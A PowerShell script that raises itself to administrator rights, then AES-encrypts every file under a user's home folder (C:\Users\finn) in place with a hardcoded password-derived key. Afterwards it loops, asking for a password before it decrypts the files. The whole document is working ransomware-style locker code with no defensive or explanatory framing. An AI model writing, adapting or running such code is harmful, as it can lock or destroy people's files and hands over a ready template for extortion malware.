# Check if the current script is running as administrator
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    # Relaunch the script as an administrator
    Start-Process powershell.exe "-File $($MyInvocation.MyCommand.Path)" -Verb RunAs
    exit
}

# Generate AES key from password
$password = "BI-127"
$key = [System.Text.Encoding]::UTF8.GetBytes($password.PadRight(32, ' ')) # Ensure the key is 32 bytes (256 bits)
$iv = New-Object byte[] 16
[Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($iv)

# Save the IV securely
Set-Content -Path "C:\Windows\TEMP\iv.txt" -Value ([Convert]::ToBase64String($iv))

# Function to encrypt a file
function Protect-Files {
    param (
        [string]$filePath
    )
    $aes = New-Object Security.Cryptography.AesManaged
    $aes.Key = $key
    $aes.IV = $iv

    $cryptoTransform = $aes.CreateEncryptor()
    $fileContent = [System.IO.File]::ReadAllBytes($filePath)
    $encryptedContent = $cryptoTransform.TransformFinalBlock($fileContent, 0, $fileContent.Length)

    [System.IO.File]::WriteAllBytes($filePath, $encryptedContent)
}

# Encrypt all files in the specified directory and its subdirectories
$targetDirectory = "C:\Users\finn"
Get-ChildItem -Path $targetDirectory -File -Recurse | ForEach-Object {
    Protect-Files -filePath $_.FullName
}

Write-Host "Encryption complete. All files under $targetDirectory have been encrypted."

# Function to decrypt a file
function Unprotect-Files {
    param (
        [string]$filePath
    )
    $aes = New-Object Security.Cryptography.AesManaged
    $aes.Key = $key
    $aes.IV = $iv

    $cryptoTransform = $aes.CreateDecryptor()
    $fileContent = [System.IO.File]::ReadAllBytes($filePath)
    $decryptedContent = $cryptoTransform.TransformFinalBlock($fileContent, 0, $fileContent.Length)

    [System.IO.File]::WriteAllBytes($filePath, $decryptedContent)
}

# Continuously prompt for the correct password
do {
    # Prompt for password
    $passwordInput = Read-Host -AsSecureString "Enter password to decrypt files"
    $password = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($passwordInput))

    if ($password -eq "BI-127") {
        # Generate AES key from password
        $key = [System.Text.Encoding]::UTF8.GetBytes($password.PadRight(32, ' '))
        $iv = [Convert]::FromBase64String((Get-Content -Path "C:\Windows\TEMP\iv.txt"))

        # Decrypt all files in the specified directory and its subdirectories
        $targetDirectory = "C:\Users\finn"
        Get-ChildItem -Path $targetDirectory -File -Recurse | ForEach-Object {
            Unprotect-Files -filePath $_.FullName
        }
        Write-Host "Files decrypted successfully."
        break
    } else {
        Write-Host "Incorrect password. Please try again."
    }
} while ($true)